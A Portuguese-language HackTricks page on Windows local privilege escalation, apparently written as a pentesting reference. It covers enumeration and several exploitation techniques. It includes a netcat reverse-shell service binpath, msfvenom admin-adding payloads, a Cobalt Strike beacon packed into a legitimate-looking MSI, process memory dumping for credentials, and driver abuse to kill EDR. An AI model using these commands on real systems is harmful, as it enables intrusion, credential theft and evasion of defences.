# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Access Tokens

**Se você não sabe o que são Windows Access Tokens, leia a página a seguir antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulte a página a seguir para mais informações sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se você não sabe o que são integrity levels no Windows, deveria ler a página a seguir antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de Segurança do Windows

Existem diferentes mecanismos no Windows que podem **impedir que você enumere o sistema**, executar executáveis ou até **detectar suas atividades**. Você deve **ler** a **página** a seguir e **enumerar** todos esses **mecanismos de defesa** antes de começar a enumeração de privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informações do Sistema

### Enumeração de informações de versão

Verifique se a versão do Windows tem alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para procurar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Esta base de dados tem mais de 4.700 vulnerabilidades de segurança, mostrando a **massive attack surface** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson incorporado)_

**Localmente com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Alguma credencial/informação "Juicy" salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Arquivos de Transcrição

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalhes das execuções do pipeline do PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. Contudo, detalhes completos da execução e os resultados de saída podem não ser capturados.

Para habilitar isso, siga as instruções na seção "Transcript files" da documentação, optando por **"Module Logging"** em vez de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver os últimos 15 eventos dos logs do PowersShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Um registro completo de atividade e do conteúdo integral da execução do script é capturado, garantindo que cada bloco de código seja documentado enquanto é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para investigações forenses e para analisar comportamentos maliciosos. Ao documentar toda a atividade no momento da execução, são fornecidos insights detalhados sobre o processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de logging para o Script Block podem ser localizados no Windows Event Viewer no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para exibir os últimos 20 eventos você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S** mas http.

Comece verificando se a rede usa um WSUS sem SSL executando o seguinte no cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou o seguinte em PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se receber uma resposta como uma destas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` estiverem iguais a `1`.

Então, **é explorável.** Se o último registro for igual a `0`, a entrada do WSUS será ignorada.

Para explorar essas vulnerabilidades você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - são scripts de exploit MiTM “armados” para injetar atualizações 'falsas' em tráfego WSUS não-SSL.

Leia a pesquisa aqui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

## WSUS CVE-2020-1013

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, esse é o defeito que este bug explora:

> Se tivermos o poder de modificar o proxy do usuário local, e o Windows Updates usar o proxy configurado nas configurações do Internet Explorer, teremos então o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar código como um usuário elevado no nosso asset.
>
> Além disso, como o serviço WSUS usa as configurações do usuário atual, ele também usará o repositório de certificados desse usuário. Se gerarmos um certificado autoassinado para o nome do host do WSUS e adicionarmos esse certificado ao repositório de certificados do usuário atual, seremos capazes de interceptar tanto o tráfego WSUS em HTTP quanto em HTTPS. O WSUS não usa mecanismos tipo HSTS para implementar uma validação do tipo trust-on-first-use no certificado. Se o certificado apresentado for confiável pelo usuário e tiver o nome do host correto, ele será aceito pelo serviço.

Você pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (uma vez que esteja liberada).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muitos agentes empresariais expõem uma superfície de IPC em localhost e um canal de atualização privilegiado. Se o enrollment puder ser coagido para um servidor do atacante e o updater confiar em uma rogue root CA ou em verificações de assinatura fracas, um usuário local pode entregar um MSI malicioso que o serviço SYSTEM instala. Veja uma técnica generalizada (baseada na cadeia Netskope stAgentSvc – CVE-2025-0309) aqui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Uma vulnerabilidade de local privilege escalation existe em ambientes de domínio Windows sob condições específicas. Essas condições incluem ambientes onde LDAP signing não é aplicado, usuários possuem self-rights que lhes permitem configurar Resource-Based Constrained Delegation (RBCD), e a capacidade de usuários criarem computadores dentro do domínio. É importante notar que esses requisitos são atendidos usando as configurações padrão.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** essas 2 chaves de registro estiverem **habilitadas** (valor é **0x1**), então usuários com qualquer privilégio podem **instalar** (executar) `*.msi` arquivos como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão meterpreter você pode automatizar esta técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar, dentro do diretório atual, um binário MSI do Windows para escalar privilégios. Este script grava um instalador MSI pré-compilado que solicita uma adição de usuário/grupo (então você precisará de acesso GIU):
```
Write-UserAddMSI
```
Basta executar o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender como criar um MSI wrapper usando estas ferramentas. Note que você pode empacotar um "**.bat**" file se você **just** quiser **executar** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Criar MSI com WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Criar MSI com Visual Studio

- **Gere** com Cobalt Strike ou Metasploit um **novo payload TCP EXE para Windows** em `C:\privesc\beacon.exe`
- Abra o **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de busca. Selecione o projeto **Setup Wizard** e clique **Next**.
- Dê ao projeto um nome, como **AlwaysPrivesc**, use **`C:\privesc`** para a localização, selecione **place solution and project in the same directory**, e clique **Create**.
- Continue clicando **Next** até chegar ao passo 3 de 4 (choose files to include). Clique **Add** e selecione o Beacon payload que você acabou de gerar. Então clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e, em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
- Há outras propriedades que você pode alterar, como **Author** e **Manufacturer**, o que pode fazer o aplicativo instalado parecer mais legítimo.
- Clique com o botão direito no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito em **Install** e selecione **Add Custom Action**.
- Dê um duplo clique em **Application Folder**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o payload beacon seja executado assim que o instalador for executado.
- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
- Finalmente, **build it**.
- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for mostrado, certifique-se de que definiu a plataforma para x64.

### Instalação do MSI

Para executar a **instalação** do arquivo `.msi` malicioso em **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar essa vulnerabilidade você pode usar: _exploit/windows/local/always_install_elevated_

## Antivírus e Detectores

### Configurações de Auditoria

Essas configurações determinam o que está sendo **registrado**, então você deve prestar atenção
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, é interessante saber para onde os logs são enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** é projetado para o gerenciamento de senhas do Administrator local, garantindo que cada senha seja única, aleatória e atualizada regularmente em computadores ingressados em um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que tenham recebido permissões suficientes por meio de ACLs, permitindo que visualizem local admin passwords se autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se ativo, senhas em plain-text são armazenadas no LSASS (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partir do **Windows 8.1**, a Microsoft introduziu proteção reforçada para a Local Security Authority (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, aumentando a segurança do sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** foi introduzido no **Windows 10**. Seu propósito é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** são autenticadas pela **Local Security Authority** (LSA) e utilizadas por componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, as domain credentials do usuário normalmente são estabelecidas.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuários & Grupos

### Enumerar Usuários & Grupos

Você deve verificar se algum dos grupos aos quais você pertence possui permissões interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Se você **pertence a algum grupo privilegiado, pode ser capaz de escalar privilégios**. Saiba sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulte a página a seguir para **aprender sobre tokens interessantes** e como abusar deles:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Pastas do usuário
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de Senhas
```bash
net accounts
```
### Obter o conteúdo da área de transferência
```bash
powershell -command "Get-Clipboard"
```
## Processos em Execução

### Permissões de Arquivos e Pastas

Primeiro de tudo, ao listar os processos **verifique por senhas na linha de comando do processo**.\
Verifique se você pode **sobrescrever algum binário em execução** ou se tem permissões de escrita na pasta do binário para explorar possíveis [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique se há possíveis [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Você pode criar um memory dump de um processo em execução usando **procdump** do sysinternals. Serviços como FTP costumam ter as **credentials in clear text in memory** — tente fazer um dump da memória e ler as credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicativos GUI inseguros

**Aplicativos executando como SYSTEM podem permitir que um usuário inicie um CMD ou navegue por diretórios.**

Exemplo: "Windows Help and Support" (Windows + F1), procure por "command prompt", clique em "Click to open Command Prompt"

## Serviços

Service Triggers permitem que o Windows inicie um serviço quando certas condições ocorrem (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Mesmo sem direitos SERVICE_START, muitas vezes é possível iniciar serviços privilegiados acionando seus triggers. Veja técnicas de enumeração e ativação aqui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obter uma lista de serviços:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações de um serviço
```bash
sc qc <service_name>
```
Recomenda-se ter o binário **accesschk** da _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Recomenda-se verificar se "Authenticated Users" podem modificar qualquer serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar serviço

Se você estiver recebendo este erro (por exemplo com SSDPSRV):

_Ocorreu o erro de sistema 1058._\
_O serviço não pode ser iniciado, seja porque está desativado ou porque não há dispositivos habilitados associados a ele._

Você pode habilitá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em conta que o serviço upnphost depende de SSDPSRV para funcionar (para XP SP1)**

**Outra solução alternativa** para este problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar caminho do binário do serviço**

No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar serviço
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilégios podem ser escalados através de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite reconfiguração do binário do serviço.
- **WRITE_DAC**: Permite reconfiguração de permissões, levando à capacidade de alterar as configurações do serviço.
- **WRITE_OWNER**: Permite aquisição de propriedade e reconfiguração de permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar as configurações do serviço.
- **GENERIC_ALL**: Também herda a capacidade de alterar as configurações do serviço.

Para a detecção e exploração desta vulnerabilidade, o _exploit/windows/local/service_permissions_ pode ser utilizado.

### Permissões fracas nos binários de serviços

**Verifique se você pode modificar o binário que é executado por um serviço** ou se você tem **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Você pode obter cada binário que é executado por um serviço usando **wmic** (not in system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissões de modificação do registro de serviços

Você deve verificar se pode modificar algum registro de serviço.\
Você pode **verificar** suas **permissões** sobre um **registro de serviço** fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Deve ser verificado se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões `FullControl`. Se sim, o binário executado pelo serviço pode ser alterado.

Para alterar o Path do binário executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permissões AppendData/AddSubdirectory do registro de serviços

Se você tiver essa permissão sobre um registro, isso significa que **você pode criar sub-registros a partir deste**. No caso de serviços do Windows, isso é **suficiente para executar código arbitrário:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada parte que termina antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentará executar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste todos os caminhos de serviço não entre aspas, excluindo aqueles pertencentes aos serviços integrados do Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** esta vulnerabilidade com metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binário de serviço com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ações de Recuperação

O Windows permite que usuários especifiquem ações a serem executadas caso um serviço falhe. Esse recurso pode ser configurado para apontar para um binary. Se esse binary puder ser substituído, pode ser possível realizar privilege escalation. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicações

### Aplicações Instaladas

Verifique as **permissões dos binaries** (talvez você consiga sobrescrever um e realizar privilege escalation) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissões de Escrita

Verifique se você pode modificar algum arquivo de configuração para ler algum arquivo especial ou se pode modificar algum binário que será executado por uma conta de Administrador (schedtasks).

Uma forma de encontrar permissões fracas em pastas/arquivos no sistema é fazendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Executar na inicialização

**Verifique se você pode sobrescrever algum registry ou binary que será executado por um usuário diferente.**\
**Leia** a **página seguinte** para saber mais sobre interessantes **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure por possíveis **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se um driver expõe um arbitrary kernel read/write primitive (comum em poorly designed IOCTL handlers), você pode elevar privilégios roubando um token SYSTEM diretamente da memória do kernel. Veja a técnica passo a passo aqui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race-condition onde a chamada vulnerável abre um Object Manager path controlado pelo atacante, retardar deliberadamente o lookup (usando componentes de tamanho máximo ou cadeias de diretório profundas) pode alongar a janela de microsegundos para dezenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitivas de corrupção de memória do registry hive

Vulnerabilidades modernas em hive permitem que você molde layouts determinísticos, abuse de descendentes HKLM/HKU graváveis, e converta corrupção de metadata em overflows do kernel paged-pool sem um driver customizado. Aprenda a cadeia completa aqui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusando da ausência de FILE_DEVICE_SECURE_OPEN em device objects (LPE + EDR kill)

Alguns drivers de terceiros assinados criam seu device object com um SDDL forte via IoCreateDeviceSecure, mas esquecem de setar FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, o DACL seguro não é aplicado quando o dispositivo é aberto através de um path contendo um componente extra, permitindo que qualquer usuário não privilegiado obtenha um handle usando um namespace path como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Uma vez que um usuário consegue abrir o device, IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e tampering. Capacidades observadas na prática:
- Retornar handles com full-access para processos arbitrários (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Leitura/escrita raw ilimitada do disco (tampering offline, truques de persistência no boot).
- Terminar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo kill de AV/EDR desde user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

